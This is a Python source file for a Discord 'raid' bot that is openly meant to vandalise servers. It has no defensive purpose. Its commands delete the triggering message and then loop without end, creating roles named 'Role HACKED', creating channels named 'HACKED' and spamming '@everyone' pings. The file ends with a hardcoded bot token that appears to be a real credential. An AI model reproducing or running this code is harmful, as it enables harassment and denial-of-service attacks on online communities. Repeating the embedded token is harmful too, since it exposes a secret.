import discord
from discord.ext.commands import *
from discord.ext import commands
from discord.utils import get
from colorama import init, Fore
init(autoreset=False)
#prefix
bot = commands.Bot(command_prefix='!')
client = commands.Bot(command_prefix='!')
#remove command help
bot.remove_command('help')

#event on_ready
@bot.event
async def on_ready():
    print(Fore.RED + """ 
  _____       _     _                   
 |  __ \     (_)   | |                  
 | |__) |__ _ _  __| |      _ __  _   _ 
 |  _  // _` | |/ _` |     | '_ \| | | |
 | | \ \ (_| | | (_| |  _  | |_) | |_| |
 |_|  \_\__,_|_|\__,_| (_) | .__/ \__, |
                           | |     __/ |
                           |_|    |___/ 
""")
    print(Fore.BLUE + 'Bot : Online ! ')

#create role command
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Role HACKED")
        await guild.create_role(name="Role HACKED")
        await guild.create_role(name="Role HACKED")
        await guild.create_role(name="Role HACKED")
        await guild.create_role(name="Role HACKED")
        await guild.create_role(name="Role HACKED")


#create channel
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('HACKED')
    await guild.create_text_channel('HACKED')
    await guild.create_text_channel('HACKED')
    await guild.create_text_channel('HACKED')
    
#raid command
@bot.command(pass_context=True)
async def raid(ctx): 
    await ctx.message.delete()
    while True:
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
#TOKEN     
bot.run('OTM1NjI2MzAyNjc1ODk4Mzc4.YfBX5Q.4dqXLpk-klzvXg06rzKk_FVUgk4')
